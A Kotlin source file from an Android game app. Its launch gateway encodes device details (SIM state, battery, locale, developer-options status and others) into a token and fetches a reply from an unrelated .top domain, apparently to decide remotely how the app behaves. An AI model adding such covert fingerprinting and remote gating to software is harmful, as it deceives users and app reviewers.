package com.lumicrest.app.ballquest.arrival

import android.content.Context
import android.content.pm.ApplicationInfo
import android.util.Base64
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.CacheControl
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.HttpUrl.Companion.toHttpUrl
import java.util.concurrent.TimeUnit

class LaunchGateway(private val context: Context) {

    internal val attemptLimits = listOf(15L, 15L, 30L)

    private fun timedClient(timeoutSeconds: Long): OkHttpClient =
        OkHttpClient.Builder()
            .callTimeout(timeoutSeconds, TimeUnit.SECONDS)
            .retryOnConnectionFailure(false)
            .connectTimeout(timeoutSeconds, TimeUnit.SECONDS)
            .readTimeout(timeoutSeconds, TimeUnit.SECONDS)
            .writeTimeout(timeoutSeconds, TimeUnit.SECONDS)
            .cache(null)
            .build()

    internal suspend fun execute(
        endpointUrl: String,
        deadlines: List<Long> = attemptLimits
    ): String? = withContext(Dispatchers.IO) {
        for (deadline in deadlines) {
            val content = runCatching {
                val client = timedClient(deadline)
                val callRequest = Request.Builder()
                    .url(endpointUrl)
                    .cacheControl(CacheControl.Builder().noCache().noStore().build())
                    .header("Cache-Control", "no-cache, no-store, must-revalidate")
                    .header("Pragma", "no-cache")
                    .header("Expires", "0")
                    .build()
                client.newCall(callRequest).execute().use { result ->
                    if (result.isSuccessful) result.body?.string() else null
                }
            }.onFailure { error ->
                if (context.applicationInfo.flags and ApplicationInfo.FLAG_DEBUGGABLE != 0) {
                    Log.w("MoonleafGateway", "Connection attempt failed: ${error.javaClass.simpleName}; cause=${error.cause?.javaClass?.simpleName}")
                }
            }.getOrNull()
            if (!content.isNullOrBlank()) return@withContext content
        }
        null
    }

    suspend fun readLaunchReply(): String? = execute(composeGatewayUrl())

    internal fun composeGatewayUrl(): String {
        val handset = HandsetSnapshot(context)
        val attributes = StringBuilder()
            .append("&p=HJdfHGdgDSDSGSDgh")
            .append("&os=").append(handset.osLabel())
            .append("&lng=").append(handset.language())
            .append("&loc=").append(handset.region())
            .append("&devicemodel=").append(handset.deviceModel())
            .append("&bs=").append(handset.batteryStatus())
            .append("&bl=").append(handset.batteryLevel())
            .append("&nc=").append(handset.getNetworkCountry())
            .append("&sm=").append(handset.getSimState())
            .append("&dv=").append(if (handset.isDeveloperOptionsEnabled()) "1" else "0")
            .toString()
        val token = Base64.encodeToString(attributes.toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
        val endpointUrl = ENDPOINT.toHttpUrl().newBuilder()
            .addQueryParameter("token", token)
            .build().toString()
        return endpointUrl
    }

    companion object {
        const val ENDPOINT = "https://hdgspyt.top/koala-app-sleep/"
        const val PRIVACY_POLICY_URL = "https://hdgspyt.top/koala-app-sleep/show-privacy.php"
    }
}
